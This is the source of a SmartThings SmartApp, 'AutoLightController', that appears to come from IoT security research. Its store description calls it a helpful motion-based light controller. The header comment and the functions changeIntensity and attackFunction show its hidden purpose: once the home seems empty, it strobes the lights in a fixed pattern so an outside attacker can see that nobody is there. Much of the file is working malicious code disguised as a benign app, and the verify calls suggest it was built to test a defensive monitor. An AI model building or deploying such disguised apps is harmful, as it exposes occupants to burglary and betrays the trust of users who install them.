
/**

 *  AutoLightController

 *

 *  Copyright 2016 Yunhan Jia

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Attack Description:
    The malicious smartApps could leak the sensitive information through side channel, like strobing the light.



Malicous LightController:
    Normal functions:
    When the motionsensor does not detect the motion for 5 minutes , then it would tell the light that there is nobody home and let the light turn off. If there is a motion detected, the light would be turned on.

    Malicious functions:
    The malicious light bulb would try to strobe the light when there is nobody home to tell the attacker that there is nobody home. The pattern of the strobing light needs to let the attacker see the light strobing whenever he comes to the user’s home. So the strobing need to be consistent. We designed that when there is nobody home, the light would reduce lightlevel every 10 seconds. When the intensity of light gets to 20, it begins to add lightlevel per 10 sec. When user home(the motionsensor detects the motion), the light stops strobing.

 */

definition(

    name: "AutoLightController",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "To make your light controlling smart, this light controller could control the light according to your motion detected by motionsensor. It could help you turn on the light when you are home and turn off it when you are leaving automatically.",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"
)

 

 

preferences {

       section("Title") {

               input "themotionsensor", "capability.motionSensor", title: "Where?"

         input "minutes", "number", required: true, title: "Minutes?"

         //input "myswitch", "capability.switch", title: "switch?"

         input "myswitch", "capability.switchLevel", title:"switchlevel?", multiple: true

 

       }

}

 

def installed() {
    log.debug("Installed with settings: $settings")
    initialize()
}

def updated() {
    log.debug("Updated with settings: $settings")
    unsubscribe()
    initialize()
}

def initialize() {
    subscribe(themotionsensor, 'motion.active', motionDetectedHandler)
    subscribe(themotionsensor, 'motion.inactive', motionStoppedHandler)
}

def myHandler(evt) {
    try {
        log.debug('attack')
        runIn(60 * minutes , changeIntensity, ['overwrite': false])
    } 
    catch (java.lang.Exception e) {
        log.debug(e)
    } 
    finally { 
    } 
}

def changeIntensity() {
    def value = myswitch.currentState('level').value.first().toInteger()
    if ( state .motionDetected == true) {
        parent.verify(app.getLabel(), null, myswitch.getDisplayName(), 'set_level', 80) == true ? myswitch.setLevel(80) : log.debug('Invariants Violation!')
        log.debug('stop attack. value:')
    }
    log.debug("value now:$value")
    if ( state .motionDetected == false) {
        if ( value <= 20) {
            state .add = true
            parent.verify(app.getLabel(), null, myswitch.getDisplayName(), 'set_level', value + 20) == true ? myswitch.setLevel( value + 20) : log.debug('Invariants Violation!')
            log.debug("$value+20")
        }
        if ( value > 20 && value < 80 && state .add) {
            parent.verify(app.getLabel(), null, myswitch.getDisplayName(), 'set_level', value + 20) == true ? myswitch.setLevel( value + 20) : log.debug('Invariants Violation!')
            log.debug("$value+20")
        }
        if ( value >= 80) {
            state .add = false
            parent.verify(app.getLabel(), null, myswitch.getDisplayName(), 'set_level', value - 20) == true ? myswitch.setLevel( value - 20) : log.debug('Invariants Violation!')
            log.debug("$value-20")
        }
        if ( value > 20 & value < 80 && !( state .add)) {
            parent.verify(app.getLabel(), null, myswitch.getDisplayName(), 'set_level', value - 20) == true ? myswitch.setLevel( value - 20) : log.debug('Invariants Violation!')
            log.debug("$value-20")
        }
        runIn(60 * 0.1, changeIntensity, ['overwrite': false])
    }
}

def motionDetectedHandler(evt) {
    state .motionDetected = true
    log.debug('motionDetectedHandler called--home!!!')
    parent.verify(app.getLabel(), evt , myswitch.getDisplayName(), 'set_level', 80) == true ? myswitch.setLevel(80) : log.debug('Invariants Violation!')
}

def motionStoppedHandler(evt) {
    log.debug('motionStoppedHandler called')
    runIn(60 * minutes , checkMotion)
}

def checkMotion() {
    log.debug('In checkMotion scheduled method')
    def motionState = themotionsensor.currentState('motion')
    if ( motionState .value == 'inactive') {
        def elapsed = now() - motionState .date.time
        def threshold = 1000 * 60 * minutes - 0.1
        if ( elapsed >= threshold ) {
            log.debug(" ($elapsed ms):  not home!!!")
            parent.verify(app.getLabel(), null, myswitch.getDisplayName(), 'set_level', 0) == true ? myswitch.setLevel(0) : log.debug('Invariants Violation!')
            state .motionDetected = false
            attackFunction()
        } else {
            log.debug('still home')
        }
    } else {
        log.debug('Home')
    }
}

def attackFunction() {
    try {
        log.debug('attack')
        runIn(60 * 0.1, changeIntensity, ['overwrite': false])
    } 
    catch (java.lang.Exception e) {
        log.debug(e)
    } 
    finally { 
    } 
}

def getChildAppDevices() {
    return settings 
}

